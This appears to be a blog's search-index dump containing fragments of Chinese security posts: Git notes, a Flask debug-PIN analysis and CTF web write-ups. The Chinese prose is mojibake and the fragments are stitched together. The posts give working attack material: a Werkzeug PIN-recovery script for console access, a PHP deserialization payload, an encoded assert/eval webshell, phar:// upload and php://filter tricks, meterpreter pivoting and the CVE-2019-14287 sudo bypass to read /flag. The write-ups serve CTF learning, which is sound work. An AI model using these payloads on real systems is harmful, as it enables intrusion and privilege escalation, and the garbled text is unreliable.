","date":"2020-02-19","objectID":"/posts/learn-git/:4:0","tags":["Git","å­¦ä¹ "],"title":"Git å­¦ä¹ ç¬”è®°","uri":"/posts/learn-git/"},{"categories":["å¿ƒè·¯å†ç¨‹"],"content":"å››ã€åˆ†æ”¯æœ‰å…³æ“ä½œ git branch åˆ—å‡ºæ‰€æœ‰åˆ†æ”¯å’Œå½“å‰æŒ‡å‘åˆ†æ”¯ \u003cbranch-name\u003e åˆ›å»ºæ–°åˆ†æ”¯ git checkout \u003cbranch-name\u003e åˆ‡æ¢åˆ°æŸåˆ†æ”¯ -b \u003cbranch-name\u003e åˆ›å»ºå¹¶åˆ‡æ¢åˆ°åˆ†æ”¯ï¼ˆç›¸å½“äºä¸€ä¸‹ä¸¤æ¡å‘½ä»¤ï¼‰ git branch \u003cbranch-name\u003e git checkout \u003cbranch-name\u003e -b \u003cbranch-name\u003e \u003cremote-name\u003e/\u003cremote-branch\u003e ä»è¿œç¨‹åˆ†æ”¯åˆ›å»ºåˆ†æ”¯å¹¶è·Ÿè¸ª --track \u003cremote-name\u003e/\u003cremote-branch\u003e ä»è¿œç¨‹åˆ†æ”¯åˆ›å»ºåŒååˆ†æ”¯å¹¶è·Ÿè¸ª -d \u003cbranch-name\u003e åˆ é™¤æŸåˆ†æ”¯ -v æ˜¾ç¤ºæ¯ä¸ªåˆ†æ”¯æœ€åä¸€æ¬¡æäº¤çš„ä¿¡æ¯ git merge \u003cbranch-name\u003e å°†æŸåˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ï¼ˆå¯èƒ½å‡ºç°å†²çªéœ€è¦æ‰‹åŠ¨å¤„ç†ï¼‰ git push \u003cremote-name\u003e \u003cbranch-name\u003e:\u003cremote-branch\u003e å°†æœ¬åœ°åˆ†æ”¯æ¨é€åˆ°å‘½åä¸åŒçš„è¿œç¨‹åˆ†æ”¯ï¼ˆæœ¬åœ°åˆ†æ”¯ç•™ç©ºæ¨é€ç©ºåˆ†æ”¯ï¼Œå³ä¸ºåˆ é™¤è¿œç¨‹åˆ†æ”¯ï¼‰ ","date":"2020-02-19","objectID":"/posts/learn-git/:5:0","tags":["Git","å­¦ä¹ "],"title":"Git å­¦ä¹ ç¬”è®°","uri":"/posts/learn-git/"},{"categories":["WEB"],"content":"0x00 å‰è¨€ ä¸Šå‘¨æ‰“å—é‚®çš„ NCTF æ—¶ç¢°åˆ°äº†ä¸€é“åä¸º flask_website çš„é¢˜ï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œä½†å‘ç°æ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œåæ¥ç‚¹åˆ°é¡µé¢æœ€ä¸‹è¾¹çš„ä¸€ä¸ªé“¾æ¥ï¼Œè·³è½¬åˆ°äº† Debug æ¨¡å¼çš„æŠ¥é”™ç•Œé¢ï¼Œä»æ­¤å¤„äº†è§£åˆ° Flask Debug PIN çš„å­˜åœ¨ï¼Œè¿™ä¸ªåˆ©ç”¨å¯èƒ½æ¯”è¾ƒé¸¡è‚‹ï¼Œä½†å€’æ˜¯æŒºæœ‰è¶£çš„ ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:1:0","tags":["Flask","WEBå®‰å…¨","å­¦ä¹ "],"title":"å…³äº Flask Debug PIN çš„å®‰å…¨æ€§é—®é¢˜","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x01 Flask Debug æ¨¡å¼ åªéœ€è¦åœ¨ app.run() çš„å‚æ•°ä¸­æ·»åŠ  debug=True å³å¯å¼€å¯ Debug æ¨¡å¼ï¼Œæ­¤æ—¶å‡ºç°é”™è¯¯å°†å‘ˆç°é”™è¯¯ä¿¡æ¯ï¼Œåœ¨æŠ¥é”™ç•Œé¢å¯ä½¿ç”¨ Flask Debug PIN ç›´æ¥è°ƒç”¨ Python console ï¼Œè¿™é‡Œåªéœ€è·å– PIN å³å¯ getshell ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:2:0","tags":["Flask","WEBå®‰å…¨","å­¦ä¹ "],"title":"å…³äº Flask Debug PIN çš„å®‰å…¨æ€§é—®é¢˜","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x02 æºç åˆ†æ # pythonæ‰€åœ¨ç›®å½•/Lib/site-packages/werkzeug/debug/__init__.py ... def get_machine_id(): global _machine_id rv = _machine_id if rv is not None: return rv def _generate(): # docker containers share the same machine id, get the # container id instead try: with open(\"/proc/self/cgroup\") as f: value = f.readline() except IOError: pass else: value = value.strip().partition(\"/docker/\")[2] if value: return value # Potential sources of secret information on linux. The machine-id # is stable across boots, the boot id is not for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\": try: with open(filename, \"rb\") as f: return f.readline().strip() except IOError: continue # On OS X we can use the computer's serial number assuming that # ioreg exists and can spit out that information. try: # Also catch import errors: subprocess may not be available, e.g. # Google App Engine # See https://github.com/pallets/werkzeug/issues/925 from subprocess import Popen, PIPE dump = Popen( [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE ).communicate()[0] match = re.search(b'\"serial-number\" = \u003c([^\u003e]+)', dump) if match is not None: return match.group(1) except (OSError, ImportError): pass # On Windows we can use winreg to get the machine guid wr = None try: import winreg as wr except ImportError: try: import _winreg as wr except ImportError: pass if wr is not None: try: with wr.OpenKey( wr.HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, wr.KEY_READ | wr.KEY_WOW64_64KEY, ) as rk: machineGuid, wrType = wr.QueryValueEx(rk, \"MachineGuid\") if wrType == wr.REG_SZ: return machineGuid.encode(\"utf-8\") else: return machineGuid except WindowsError: pass _machine_id = rv = _generate() return rv ... def get_pin_and_cookie_name(app): \"\"\"Given an application object this returns a semi-stable 9 digit pin code and a random key. The hope is that this is stable between restarts to not make debugging particularly frustrating. If the pin was forcefully disabled this returns `None`. Second item in the resulting tuple is the cookie name for remembering. \"\"\" pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\") rv = None num = None # Pin was explicitly disabled if pin == \"off\": return None, None # Pin was provided explicitly if pin is not None and pin.replace(\"-\", \"\").isdigit(): # If there are separators in the pin, return it directly if \"-\" in pin: rv = pin else: num = pin modname = getattr(app, \"__module__\", app.__class__.__module__) try: # getuser imports the pwd module, which does not exist in Google # App Engine. It may also raise a KeyError if the UID does not # have a username, such as in Docker. username = getpass.getuser() except (ImportError, KeyError): username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, \"__name__\", app.__class__.__name__), getattr(mod, \"__file__\", None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [str(uuid.getnode()), get_machine_id()] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, text_type): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") cookie_name = \"__wzd\" + h.hexdigest()[:20] # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits if num is None: h.update(b\"pinsalt\") num = (\"%09d\" % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num return rv, cookie_name ... ä»ç¬¬äºŒä¸ªå‡½æ•°å¾—çŸ¥ï¼Œç”Ÿæˆ Flask Debug PIN å…±éœ€è¦å…­ä¸ªå‚æ•° usern","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:3:0","tags":["Flask","WEBå®‰å…¨","å­¦ä¹ "],"title":"å…³äº Flask Debug PIN çš„å®‰å…¨æ€§é—®é¢˜","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x03 åˆ©ç”¨è¿‡ç¨‹ è¿™é‡Œæƒ³è¦åˆ©ç”¨ Flask Debug PIN ï¼Œéœ€è¦é…åˆä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ä½¿ç”¨ï¼ŒåŸé¢˜ä¸­ä½¿ç”¨äº† urllib åº“ï¼Œå¯ä»¥é€šè¿‡ file åè®®è¯»å–æ–‡ä»¶ï¼Œè·å–å¯¹åº”å‚æ•°ï¼Œå†ä»ä¸Šæ–¹ç¬¬äºŒä¸ªå‡½æ•°ä¸­æå– PIN çš„ç”Ÿæˆè¿‡ç¨‹ï¼Œæ„æˆå¦‚ä¸‹è„šæœ¬ import hashlib from itertools import chain probably_public_bits = [ 'username', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) 'pythonæ‰€åœ¨ç›®å½•/Lib/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ 'MAC åœ°å€åè¿›åˆ¶è¡¨ç¤º', # str(uuid.getnode())ï¼Œ/sys/class/net/ç½‘å¡åç§°/address 'machine_id' # get_machine_id() ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) é€šè¿‡è„šæœ¬ç”Ÿæˆ PIN ï¼Œåœ¨æŠ¥é”™ç•Œé¢ä¸­è¾“å…¥å³å¯è·å– Python console ï¼Œå†é€šè¿‡ os.popen('xxx').readlines() å‡½æ•°å³å¯ getshell ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:4:0","tags":["Flask","WEBå®‰å…¨","å­¦ä¹ "],"title":"å…³äº Flask Debug PIN çš„å®‰å…¨æ€§é—®é¢˜","uri":"/posts/flask-debug-pin/"},{"categories":["WEB"],"content":"0x04 æ€»ç»“ æ­¤åˆ©ç”¨è¿‡ç¨‹ç•¥æ˜¾é¸¡è‚‹ï¼Œä½†å¯¹ Flask çš„ Debug æ¨¡å¼ å’Œ Flask Debug PIN æœ‰äº†å¤§è‡´äº†è§£ï¼Œå¯ä»¥åœ¨ä»¥åçš„å­¦ä¹ è¿‡ç¨‹ä¸­åŠ ä»¥åˆ©ç”¨ï¼Œè¾¾åˆ°æ›´å¥½çš„æ•ˆæœ ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:5:0","tags":["Flask","WEBå®‰å…¨","å­¦ä¹ "],"title":"å…³äº Flask Debug PIN çš„å®‰å…¨æ€§é—®é¢˜","uri":"/posts/flask-debug-pin/"},{"categories":["CTF"],"content":"0x00 åæ§½æ€è€ƒ for [BOSS] Get Me Inside è¿™é“é¢˜è‚çš„æ˜¯çœŸçš„çˆ½ï¼Œä» ddl å‰ä¸€å¤©æ™šä¸Šå¼€å§‹ï¼Œæåˆ° ddl å½“å¤©å‡Œæ™¨å››ç‚¹å¤š~~ï¼ˆåŸæ¥æˆ‘çš„è‚è¿™ä¹ˆå¥½ï¼‰~~ è¿™æ˜¯ä¸€é“æ¶‰åŠé¢å¹¿æ³›çš„é¢˜ï¼Œè€ƒè™‘åˆ°äº†å®æˆ˜çš„ä¸€äº›æƒ…å†µï¼Œè€ƒå¯Ÿå¤šæ–¹é¢çš„çŸ¥è¯†ï¼Œæ˜¯ä¸€é“ä¸å¯å¤šå¾—çš„å¥½é¢˜ï¼ˆå³ä½¿å¦‚æ­¤ï¼Œæˆ‘ä¾æ—§æƒ³æš´æ‰“å„ä½å‡ºé¢˜äººemmmï¼‰ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:1:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Bossé¢˜ WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x01 ååºåˆ—åŒ–æ¼æ´ æ‰“å¼€è¿™é“é¢˜é¦–å…ˆå°±æ˜¯ä¸€å † PHP æºç ï¼Œç›´æ¥å°±æ‘†ä¸Šäº†ä¸€å¤§å † class ï¼Œå…ˆæš‚æ—¶ç•¥è¿‡è¿™äº› class ï¼Œç»§ç»­å‘ä¸‹çœ‹ï¼Œæˆ‘ä»¬ä¼šå‘ç°åœ¨æºç çš„æœ«å°¾æœ‰è¿™ä¹ˆä¸€æ®µ \u003c?php $a = $_GET['p']; unserialize($a); if($flag === 1){ ... } ?\u003e ç»“åˆä¸Šè¾¹çš„ä¸€å¤§å † class ï¼Œè€ƒè™‘åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œå±‚å±‚é€’è¿›ï¼Œæœ€ç»ˆå°†å˜é‡ flag çš„å€¼è®¾ä¸º 1 å³å¯ï¼Œæ•…æ„é€ ä»¥ä¸‹ payload ï¼ˆè¿™é‡Œå¯ä»¥ç›´æ¥å¤åˆ¶ç²˜è´´ï¼Œç„¶åè‡ªå·±å†™ä¸€ä¸ªè„šæœ¬æŠŠéœ€è¦çš„å˜é‡åºåˆ—åŒ–ä¸€ä¸‹å³å¯ï¼‰ /?p=O:4:\"Deep\":2:{s:2:\"m1\";O:4:\"Dark\":2:{s:2:\"m1\";O:7:\"Fantasy\":2:{s:2:\"m1\";O:5:\"Happy\":2:{s:2:\"m1\";O:8:\"New_year\":2:{s:2:\"s1\";O:21:\"Copied_from_somewhere\":0:{}s:2:\"s2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;}s:2:\"m2\";N;} è¾“å…¥åå‘ç°åœ¨æœªæä¾›å‚æ•° c çš„æƒ…å†µä¸‹è¾“å‡ºäº† ? ï¼Œå¯çŸ¥æˆåŠŸå°† flag è®¾ä¸º 1 ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:2:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Bossé¢˜ WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x02 get shell ä¹‹åæŸ¥çœ‹æœ€åçš„ä¸€æ®µæºç  \u003c?php if(!isset($_GET['c'])){ die(\"?\"); } $code = $_GET['c']; if(strlen($code)\u003e37){ die(\"è¿™ä¹ˆé•¿ä¼šæ­»çš„!\"); } if(preg_match(\"/[A-Za-z0-9^!]+/\",$code)){ die(\"Catch you!\"); } @eval($code); ?\u003e è€ƒè™‘é€šè¿‡ eval è¿™ä¸ªå‡½æ•°è°ƒç”¨å…¶ä»–å‡½æ•°æ‹¿åˆ°ç³»ç»Ÿ shell ï¼Œç„¶è€Œé¦–å…ˆè¦é¢å¯¹çš„é—®é¢˜å°±æ˜¯è¿™ä¸ªå¯æ¶çš„æ­£åˆ™ï¼Œä½ æ³¨å…¥çš„ä»£ç ä¸­ä¸èƒ½åŒ…å«ä»»ä½•å­—æ¯ã€æ•°å­—å’Œ ^ ! ä¸¤ç§ç¬¦å· è¿™é‡Œå¯ä»¥ä½¿ç”¨ PHP çš„å¦ä¸€ç§å‡½æ•°è°ƒç”¨æ–¹å¼ (å‡½æ•°å)(å‚æ•°) ï¼Œç„¶åå‡½æ•°åå’Œå‚æ•°éƒ½é‡‡ç”¨æŒ‰ä½å–åçš„æ–¹å¼ï¼Œé€šè¿‡urlç¼–ç å’Œ ~ è¿ç®—ç¬¦è°ƒç”¨å‡½æ•° ç„¶åæˆ‘ä»¬éå¸¸é«˜å…´çš„æ‰§è¡Œäº† system('whoami') ï¼Œä½†æ˜¯ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿï¼Œçœ‹ä¸€ä¸‹ phpinfo() ï¼Œå‘ç°å‡ ä¹æ‰€æœ‰èƒ½æ‹¿åˆ°ç³»ç»Ÿshellçš„å‡½æ•°éƒ½åœ¨ disable_functions é‡Œï¼Œç„¶åè€ƒè™‘ç»•è¿‡ disable_functions çš„æ–¹æ³•ï¼Œç»è¿‡å¤šæ–¹æŸ¥æ‰¾ï¼Œæœ€åé€‰æ‹©äº†é€šè¿‡ LD_PRELOAD çš„æ–¹å¼ç»•è¿‡ï¼Œä½†è¿™ç§æ–¹æ³•éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œæ‰€ä»¥ç»§ç»­æ„é€  payload /?p=O:4:%22Deep%22:2:{s:2:%22m1%22;O:4:%22Dark%22:2:{s:2:%22m1%22;O:7:%22Fantasy%22:2:{s:2:%22m1%22;O:5:%22Happy%22:2:{s:2:%22m1%22;O:8:%22New_year%22:2:{s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:{}s:2:%22s2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}\u0026c=(~%9e%8c%8c%9a%8d%8b)(${~%a0%b8%ba%ab}[%aa]);\u0026%aa=eval($_POST['aaa']); è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å¦ä¸€ä¸ªå¯ä»¥æ‰§è¡Œ PHP è¯­å¥çš„å‡½æ•° assert ï¼Œä½†ç”±äº assert ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­å†åŠ å…¥ä¸€ä¸ª eval ï¼Œè¿™é‡Œä¾¿å‡ºç°äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„ä¸€å¥è¯æœ¨é©¬ï¼ŒäºŒè¯ä¸è¯´æ‰”åˆ°èšå‰‘é‡Œï¼Œå‘ç° shell ä¾ç„¶æ— æ³•ä½¿ç”¨ï¼Œä½†å¯ä»¥è¯»å–å’Œä¸Šä¼ æ–‡ä»¶ï¼ˆè¿™é‡Œæ˜¯å› ä¸ºè¯»å–å’Œä¸Šä¼ æ–‡ä»¶å¯ä»¥ç”¨ PHP è‡ªå¸¦çš„å…¶å®ƒå‡½æ•°å®ç°ï¼Œæ‰€ä»¥ä¸éœ€è¦æ‹¿åˆ° shell å°±å¯ä»¥ï¼‰ï¼Œç”±äº hint å‘Šè¯‰æˆ‘ä»¬å¯¹ html ç›®å½•æ²¡æœ‰å†™æƒé™ï¼Œæ•…è€ƒè™‘å¦ä¸€ä¸ªç›®å½• /tmp ï¼Œæµ‹è¯•åå‘ç°æœ‰å†™æƒé™ï¼Œæ•…å¯ä»¥ä¸Šä¼ æ„é€ çš„ so æ–‡ä»¶è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œï¼ˆä½†å½“æ—¶æœåŠ¡å™¨é‡Œæœ‰ä¸çŸ¥å“ªä½å¥½å¿ƒçš„å¤§å“¥ç•™ä¸‹çš„ so æ–‡ä»¶ï¼Œæˆ‘å°±ç›´æ¥æ‹¿æ¥ç”¨äº†ï¼Œåæ¥çŸ¥é“é‚£ä¸ªæ–‡ä»¶å‡ºè‡ªæ­¤å¤„ï¼Œè¿™ä¸ªæ„é€ çš„ååˆ†å·§å¦™ï¼Œä½¿ç”¨äº†å¦ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œé…åˆ PHP å®ç°ä¸€æ¬¡ç¼–è¯‘å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ— éœ€æ¯æ¬¡ä¿®æ”¹å‘½ä»¤éƒ½è¦é‡æ–°ç¼–è¯‘ï¼Œå­¦åˆ°äº†)ï¼Œç„¶å include ä¸€ä¸‹é…å¥—çš„ PHP æ–‡ä»¶ï¼ŒæŒ‰ç…§ PHP é‡Œçš„å‚æ•°é…ç½®ä¸€ä¸‹ï¼ŒæˆåŠŸæ‹¿åˆ°ç³»ç»Ÿshell ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:3:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Bossé¢˜ WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x03 å†…ç½‘ç©¿é€ ç”±äº hint ç»™å‡ºäº† LAN \u0026 ARP ï¼Œè¿™é‡Œè€ƒè™‘ flag å¯èƒ½å­˜åœ¨äºå¦ä¸€å°æœåŠ¡å™¨ï¼ˆè®°ä¸ºæœåŠ¡å™¨2ï¼‰ä¸Šï¼Œç”¨ arp -a çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰è¿™ä¹ˆä¸€ä¸ª IP ä¸ä¼—ä¸åŒ getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0 curl çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªç½‘é¡µå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè€ƒè™‘å°†æœåŠ¡å™¨2çš„80ç«¯å£è½¬å‘å‡ºæ¥ï¼Œå¯ä»¥é‡‡ç”¨ msf çš„ meterpreter æ¨¡å—ï¼ˆè¿™é‡Œéœ€è¦è‡ªå·±æœ‰ä¸€ä¸ªå…¬ç½‘ IP ï¼Œæˆ‘é€‰æ‹©å¼€äº†ä¸€ä¸ª VPS ï¼Œä¸€èˆ¬æ¥è¯´å†å°† VPS ç«¯å£è½¬å‘åˆ°æœ¬åœ°æ¯”è¾ƒå®‰å…¨ï¼Œä½†æˆ‘ä¸ºäº†æ–¹ä¾¿ç›´æ¥åœ¨ VPS ä¸Šè£…äº†ä¸ª msf ï¼Œæ¯•ç«Ÿç”¨å®Œå³åˆ ï¼‰ å…ˆç”¨ msfvenom åšä¸ªæœ¨é©¬ï¼Œç„¶åç”¨èšå‰‘ä¸Šä¼ åˆ°æœåŠ¡å™¨1ï¼Œç»™ä¸€ä¸‹æ‰§è¡Œæƒé™ï¼Œæ¥ä¸‹æ¥åœ¨ msfconsole ä¸­ç›‘å¬æœ¨é©¬è®¾ç½®çš„ç«¯å£ï¼Œç„¶åå†æœåŠ¡å™¨1ä¸­è¿è¡Œæœ¨é©¬ï¼Œæ‹¿åˆ° meterpreter shellï¼Œç„¶åç”¨ portfwd è¿›è¡Œç«¯å£è½¬å‘ï¼Œæ‰“å¼€è½¬å‘åˆ°æœåŠ¡å™¨ä¸Šçš„ç«¯å£ï¼ŒæˆåŠŸæ‰“å¼€æœåŠ¡å™¨2ä¸Šçš„ç½‘é¡µ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:4:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Bossé¢˜ WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x04 get shell Again æ‰“å¼€é¡µé¢ï¼Œå‘ç°ä¼¼ä¹å¯ä»¥ä¸Šä¼ ä»€ä¹ˆä¸œè¥¿ï¼Œè§‚å¯Ÿ url æœ‰ /?file=index ï¼Œç‚¹å‡»ä¸Šä¼ å url å˜åŒ–ä½†é¡µé¢å¹¶æœªå˜åŒ–ï¼Œå°è¯•å»æ‰æœ€åçš„ .php ï¼Œå‘ç°æˆåŠŸæ‰“å¼€ä¸Šä¼ é¡µé¢ï¼Œå¯ä»¥åˆ¤æ–­ file æ˜¯ä¸€ä¸ª include æ¼æ´ï¼Œå°è¯• phpä¼ªåè®® è¯»å–æºç ï¼Œæ„é€ ä»¥ä¸‹ payload /?file=php://filter/read=convert.base64-encode/resource=upload æˆåŠŸè¯»åˆ° upload.php çš„æºç ï¼ˆæˆ‘ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™çš„ç¡®è¯»åˆ°äº†æºç ï¼Œä½†å†æ¬¡å°è¯•å´å‘ç°è¯»ä¸åˆ°äº†QAQï¼‰ è§‚å¯Ÿä¸Šä¼ é¡µé¢ï¼Œå‘ç°å¹¶æ— è¡¨å•å¯ä»¥æäº¤ï¼Œå°±åœ¨æœ¬åœ°å†™ä¸€ä¸ªè¡¨å•æäº¤åˆ°æœåŠ¡å™¨2ï¼Œå°è¯•å‘ç°åªèƒ½ä¸Šä¼  png æ–‡ä»¶ï¼Œç”±äº hint æŒ‡å‡ºäº† Phar ï¼Œäºæ˜¯å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œæ‰“åŒ…æˆ zipï¼ˆæ³¨æ„æ‰“åŒ…æ—¶é€‰æ‹©ä¸å‹ç¼©ï¼‰ï¼Œç„¶åå°†æ‹“å±•åæ”¹ä¸º png ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œå¾—åˆ°ä¸Šä¼ åçš„æ–‡ä»¶åï¼Œæ„é€ ä»¥ä¸‹ payloadï¼ˆæ³¨æ„æœ€åçš„æœ¨é©¬åä¸éœ€è¦ .php) /?file=phar://pic/æ–‡ä»¶å/æœ¨é©¬å çœ‹ä¸€ä¸‹ phpinfo ï¼Œå‘ç°æ‹¿ shell çš„å‡½æ•°å¹¶æ²¡æœ‰è¢«ç¦ç”¨ï¼Œç›´æ¥æ‹¿åˆ°ç³»ç»Ÿshellï¼ˆè¿™é‡Œæˆ‘æƒ³å†æ‰”åˆ°èšå‰‘é‡Œï¼Œä½†è«åå…¶å¦™è¿ä¸ä¸Šï¼Œå°±æ‰‹åŠ¨æ“ä½œäº†ï¼‰ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:5:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Bossé¢˜ WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":"0x05 è¯»å– flag æ–‡ä»¶ æ ¹æ® hint ï¼Œåªæœ‰ root ç”¨æˆ·å¯ä»¥è¯»å– flag æ–‡ä»¶ï¼Œå°è¯• sudo catï¼Œå‘ç°å¹¶ä¸èƒ½è¯»å–ï¼Œsudo -l çœ‹ä¸€ä¸‹æƒé™ï¼Œå‘ç°æƒé™è®¾ç½®å¦‚ä¸‹ (ALL,!root) NOPASSWD:/bin/cat ç›´æ¥ä½¿ç”¨ sudo æ— æ³•ä½¿ç”¨ cat ï¼Œè¿™é‡Œæˆ‘æ¢ç´¢äº†æ¥è¿‘ä¸¤å°æ—¶ç»ˆäºæœåˆ°äº†ä¸€ä¸ªç¥å¥‡çš„æ¼æ´ CVE-2019-14287 ï¼Œæ¼æ´å…·ä½“ä¿¡æ¯å¯ä»¥å‚è€ƒæˆ‘å¥½ä¸å®¹æ˜“æœåˆ°çš„çš„è¿™ä¸ªç½‘ç«™ æ ¹æ®è¿™ä¸ªæ¼æ´æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ sudo -u#-1 /bin/cat /flag æˆåŠŸè·å¾— flagï¼ï¼ï¼ï¼ˆæ³ªç›®ï¼‰ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web-boss/:6:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web Bossé¢˜ WriteUp","uri":"/posts/cnss-recruit-2019-web-boss/"},{"categories":["CTF"],"content":" ç”±äºæŠ€æœ¯æœ‰é™ï¼Œæ—¶é—´åŒ†å¿™ï¼Œæœ¬æ–‡å¯èƒ½å­˜åœ¨å„ç§é—®é¢˜ã€‚å¦‚å‘ç°é—®é¢˜ï¼ˆå¦‚æ€è·¯é”™è¯¯ã€æœ¯è¯­é”™è¯¯ æˆ– æˆ‘çš„è§£æ³•å‡­ç©ºå¢åŠ äº†è§£é¢˜éš¾åº¦ ç­‰ï¼‰ï¼Œè¯·å„ä½ dalao æ¯«ä¸çŠ¹è±«çš„é”¤çˆ†æˆ‘çš„ç‹—å¤´ï¼Œè°¢è°¢ï¼ æ„Ÿè°¢ ay3 å¯¹ äº§å“ç»ç† ä¸€é¢˜è§£é¢˜æ€è·¯çš„æŒ‡æ­£ï¼Œæ„Ÿè°¢ dalaoï¼ ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:0:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"check_in web çš„ç¬¬ä¸€é“ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€å°±è¯´äº† hideï¼Œæœæ–­ F12 çœ‹æºç ï¼Œå‘ç°æ³¨é‡Šé‡Œæœ‰äº›ä¸œè¥¿ \u003c!--what is this : ./secret/f1ag_is_h4re.php--\u003e ç›´æ¥åœ¨urlåæ·»åŠ  /secret/f1ag_is_h4re.php è¿›å…¥ä¸‹ä¸€å…³ï¼Œè¿™é‡Œå†çœ‹æºç å¹¶æ— æ”¶è·ï¼Œçœ‹ä¸€ä¸‹ Cookieï¼Œå‘ç°å¤šäº†ä¸€æ¡åä¸º interesting_string çš„ Cookieï¼ŒæŸ¥çœ‹å…¶å†…å®¹å¦‚ä¸‹ Y25zc3t3ZWxjb21lX3RvX3dlYl9XMHJsZCF9 çŒœæµ‹ä¸ºæŸç§ç¼–ç ï¼Œå°è¯• base64 è§£ç ï¼ŒæˆåŠŸè·å– flag ","date":"2019-10-24","objectID":"/posts/cnss-recruit-2019-web/:1:0","tags":["CNSS","WriteUp"],"title":"CNSS Recruit 2019 Web WriteUp","uri":"/posts/cnss-recruit-2019-web/"},{"categories":["CTF"],"content":"True_check_in çœŸæ­£çš„ç­¾åˆ°é¢˜ï¼Ÿæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªæ•°å­¦é¢˜ï¼Œæœæ–­æ‰“å¼€è®¡ç®—å™¨ç®—å‡ºæ­£ç¡®ç­”æ¡ˆ 8589934592 è¾“å…¥ç­”æ¡ˆæ—¶å‘ç°é—®é¢˜ï¼Œè¾“å…¥æ¡†æœ‰é•¿åº¦é™åˆ¶ï¼Œçœ‹æºç 